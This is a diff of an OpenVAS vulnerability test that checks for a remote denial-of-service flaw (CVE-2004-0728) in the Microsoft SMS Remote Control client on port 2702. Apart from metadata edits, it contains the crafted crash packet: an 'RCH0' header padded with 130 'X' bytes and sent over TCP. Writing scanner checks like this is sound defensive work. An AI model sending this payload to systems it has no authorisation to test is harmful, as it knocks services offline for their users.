@@ -1,6 +1,5 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: mssms_dos.nasl 4831 2016-12-21 12:32:45Z cfi $
 #
 # Denial of Service (DoS) in Microsoft SMS Client
 #
@@ -24,17 +23,13 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-# Subject: Denial of Service (DoS) in Microsoft SMS Client
-# From: vuln@hexview.com
-# Date: 14.7.2004 21:45
-
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.13752");
-  script_version("$Revision: 4831 $");
+  script_version("2019-04-24T07:26:10+0000");
   script_cve_id("CVE-2004-0728");
   script_bugtraq_id(10726);
-  script_tag(name:"last_modification", value:"$Date: 2016-12-21 13:32:45 +0100 (Wed, 21 Dec 2016) $");
+  script_tag(name:"last_modification", value:"2019-04-24 07:26:10 +0000 (Wed, 24 Apr 2019)");
   script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
@@ -45,35 +40,33 @@ if(description)
   script_dependencies("find_service.nasl");
   script_require_ports(2702);
 
-  tag_summary = "Microsoft Systems Management Server provides configuration management
-  solution for Windows platform. It is widely deployed in medium and large
-  network environments. A flaw in SMS Remote Control service makes possible to
-  crash the service remotely leading to the DoS condition.
+  script_tag(name:"summary", value:"A flaw in SMS Remote Control service makes possible to
+  crash the service remotely leading to the DoS condition.");
 
-  Affected products:
-  All tests were performed on a client part of Microsoft Systems Management
-  Server version 2.50.2726.0.";
+  script_tag(name:"affected", value:"Clients part of Microsoft Systems Management Server
+  version 2.50.2726.0 are known to be vulnerable. Other versions might be affected as well.");
 
-  script_tag(name:"summary", value:tag_summary);
+  script_tag(name:"solution", value:"No known solution was made available for at least one year
+  since the disclosure of this vulnerability. Likely none will be provided anymore.
+  General solution options are to upgrade to a newer release, disable respective features,
+  remove the product or replace the product by another one.");
 
   script_tag(name:"qod_type", value:"remote_vul");
+  script_tag(name:"solution_type", value:"WillNotFix");
 
   exit(0);
 }
 
-debug = 0;
-
 port = 2702;
-if( ! get_port_state( port ) ) exit( 0 );
+if( ! get_port_state( port ) )
+  exit( 0 );
+
 soc = open_sock_tcp( port );
-if( ! soc ) exit( 0 );
+if( ! soc )
+  exit( 0 );
 
 req = raw_string( 0x52, 0x43, 0x48, 0x30, 0x16, 0x00, 0x40, 0x00, 0x52, 0x43, 0x48, 0x45 );
 req = string(req, crap( data:raw_string( 0x58 ), length:130 ) );
-
-if( debug ) {
-  display( "req: ", req, "\n" );
-}
 
 send( socket:soc, data:req );
 sleep( 1 );
